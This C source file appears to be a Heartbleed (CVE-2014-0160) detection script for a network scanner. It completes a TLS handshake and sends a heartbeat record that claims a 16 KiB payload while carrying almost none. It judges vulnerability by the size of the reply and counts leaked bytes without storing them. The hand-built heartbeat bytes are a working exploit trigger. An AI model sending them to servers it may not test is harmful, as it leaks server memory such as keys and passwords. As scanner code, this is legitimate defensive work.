/* ssl-heartbleed - OpenSSL Heartbleed (CVE-2014-0160).
 *
 * Completes a TLS handshake up to ServerHelloDone, then sends a heartbeat
 * request that claims a 16 KiB payload but carries one byte. A vulnerable
 * server answers with a heartbeat record of about 16 KiB (memory it should
 * never send); a patched server ignores the request or answers with an
 * alert. Read only: the leaked bytes are counted, never printed or kept.
 *
 * VULNERABLE / NOT VULNERABLE need a completed handshake. Anything else
 * (not TLS, handshake refused, no answer) prints INFO and the reason.
 * Replaces ssl-heartbleed, ssl-heartbleed-2 and ssl-heartbleed-full.
 * Use only on networks you own or have permission to scan.
 */
#include "arsenal_tls.h"

#define HB_LEAK_MIN 1024 /* a real reply to a 1-byte request is under 40 */

int almap_script_run(AlScriptContext *ctx) {
    static const unsigned int versions[] = { 0x0302, 0x0303, 0x0301 };
    unsigned short ids[64];
    unsigned char rec[AR_TLS_MAX_RECORD];
    unsigned char hb[8];
    ar_tls_flight f;
    int nc;
    int vi;
    int fd = -1;
    int st = AR_TLS_F_ERR;
    int last_alert = -1;
    int guard;

    if (!ar_valid(ctx)) {
        return 1;
    }
    nc = ar_tls_suite_ids(ids, 64, 0);
    for (vi = 0; vi < 3; vi++) {
        st = ar_tls_connect_hello(ctx, versions[vi], ids, nc, 1, 1, &f, &fd);
        if (st == AR_TLS_F_DONE) {
            break;
        }
        if (fd >= 0) {
            close(fd);
            fd = -1;
        }
        if (st == AR_TLS_F_ALERT) {
            last_alert = f.alert_desc; /* maybe only this version is refused */
        }
        if (st == AR_TLS_F_ERR) {
            break; /* not TLS, or no answer: other versions will not help */
        }
    }
    if (st != AR_TLS_F_DONE) {
        if (f.not_tls) {
            ar_out(ctx, "ssl-heartbleed: INFO not tested: the service did not answer with a TLS record");
        } else if (last_alert >= 0) {
            ar_out(ctx, "ssl-heartbleed: INFO not tested: no TLS handshake completed (server alert %d)", last_alert);
        } else {
            ar_out(ctx, "ssl-heartbleed: INFO not tested: no TLS handshake completed (no answer)");
        }
        return 0;
    }

    hb[0] = AR_TLS_HEARTBEAT;
    hb[1] = 0x03;
    hb[2] = (unsigned char)(versions[vi] & 255u);
    hb[3] = 0x00;
    hb[4] = 0x03;  /* record length: type + length + 1 byte of payload */
    hb[5] = 0x01;  /* heartbeat_request */
    hb[6] = 0x40;  /* payload_length 0x4000 ... */
    hb[7] = 0x00;  /* ... but only one byte follows (the one below the record) */
    if (as_send_all(fd, hb, sizeof(hb), ctx->timeout_ms) != 0) {
        close(fd);
        ar_out(ctx, "ssl-heartbleed: INFO not tested: could not send the heartbeat request");
        return 0;
    }
    for (guard = 0; guard < 4; guard++) {
        int type = 0;
        int n = ar_tls_recv_record(fd, &type, rec, sizeof(rec), ctx->timeout_ms);

        if (n < 0) {
            ar_out(ctx, "ssl-heartbleed: NOT VULNERABLE (%s handshake completed; the heartbeat request was ignored or the connection closed)",
                   ar_tls_version_name(f.version));
            break;
        }
        if (type == AR_TLS_HEARTBEAT) {
            if (n >= HB_LEAK_MIN) {
                ar_out(ctx, "ssl-heartbleed: VULNERABLE (CVE-2014-0160): a 1-byte heartbeat request returned %d bytes (%s)",
                       n, ar_tls_version_name(f.version));
            } else {
                ar_out(ctx, "ssl-heartbleed: INFO unexpected short heartbeat reply (%d bytes); not conclusive", n);
            }
            break;
        }
        if (type == AR_TLS_ALERT) {
            ar_out(ctx, "ssl-heartbleed: NOT VULNERABLE (%s handshake completed; the server answered the heartbeat request with alert %d)",
                   ar_tls_version_name(f.version), n > 1 ? rec[1] : 0);
            break;
        }
        if (guard == 3) {
            ar_out(ctx, "ssl-heartbleed: INFO no heartbeat or alert record after the request; not conclusive");
        }
    }
    close(fd);
    return 0;
}
